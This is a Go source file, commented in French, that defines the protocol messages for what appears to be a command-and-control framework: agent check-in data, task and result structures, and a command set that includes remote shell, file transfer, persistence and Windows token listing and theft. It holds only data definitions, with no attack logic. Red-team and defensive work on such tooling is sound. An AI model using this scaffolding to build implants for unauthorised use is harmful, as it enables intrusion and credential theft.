/*
 * messages.go - Structures du protocole de communication
 *
 * Définit les formats JSON échangés entre l'agent et le serveur.
 */
package protocol

import "time"

// Action types
const (
	ActionCheckin  = "checkin"
	ActionGetTasks = "get_tasks"
	ActionResult   = "result"
)

// Command types
const (
	CmdShell      = "shell"
	CmdPwd        = "pwd"
	CmdCd         = "cd"
	CmdLs         = "ls"
	CmdDownload   = "download"
	CmdUpload     = "upload"
	CmdPs         = "ps"
	CmdKill       = "kill"
	CmdWhoami     = "whoami"
	CmdSysinfo    = "sysinfo"
	CmdSleep      = "sleep"
	CmdExit       = "exit"
	CmdPersist    = "persist"
	CmdTokenList  = "token_list"
	CmdTokenSteal = "token_steal"
)

// AgentRequest est la structure générique des requêtes de l'agent
type AgentRequest struct {
	Action string      `json:"action"`
	ID     string      `json:"id"`
	Data   interface{} `json:"data,omitempty"`
}

// CheckinData contient les infos envoyées lors du check-in
type CheckinData struct {
	Hostname string `json:"hostname"`
	Username string `json:"username"`
	Domain   string `json:"domain"`
	OS       string `json:"os"`
	Arch     string `json:"arch"`
	PID      int    `json:"pid"`
	Elevated bool   `json:"elevated"`
}

// Task représente une tâche à envoyer à l'agent
type Task struct {
	TaskID  string `json:"task_id"`
	Command string `json:"command"`
	Args    string `json:"args,omitempty"`
	Data    []byte `json:"data,omitempty"`
}

// TasksResponse est la réponse contenant les tâches pour l'agent
type TasksResponse struct {
	Tasks []Task `json:"tasks"`
}

// TaskResult est le résultat d'une tâche exécutée par l'agent
type TaskResult struct {
	TaskID string `json:"task_id"`
	Status int    `json:"status"`
	Output string `json:"output,omitempty"`
	Data   []byte `json:"data,omitempty"`
}

// Agent représente un agent connecté
type Agent struct {
	ID        string    `json:"id"`
	Hostname  string    `json:"hostname"`
	Username  string    `json:"username"`
	Domain    string    `json:"domain"`
	OS        string    `json:"os"`
	Arch      string    `json:"arch"`
	PID       int       `json:"pid"`
	Elevated  bool      `json:"elevated"`
	FirstSeen time.Time `json:"first_seen"`
	LastSeen  time.Time `json:"last_seen"`
	Status    string    `json:"status"` // "active", "inactive", "dead"
}

// ServerResponse est une réponse générique du serveur
type ServerResponse struct {
	Success bool        `json:"success"`
	Message string      `json:"message,omitempty"`
	Data    interface{} `json:"data,omitempty"`
}
